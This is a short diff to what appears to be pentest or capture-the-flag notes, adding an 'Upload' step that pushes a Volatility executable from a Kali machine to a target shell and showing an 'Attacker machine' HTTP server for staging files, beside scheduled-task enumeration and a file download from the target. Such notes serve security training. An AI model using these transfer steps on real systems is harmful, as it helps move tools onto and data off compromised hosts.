@@ -64,8 +64,11 @@ PS C:\Share> $s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.Get
 |download "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"||
 ```
 
+# Upload
+```powershell
+upload /home/kali/forensic-tools/volatility3-win-exes-2.28.0/vol.exe vol.exe
+```
 
-# Kirim file
 ```shell
 # Attacker machine
 python3 -m http.server 8088
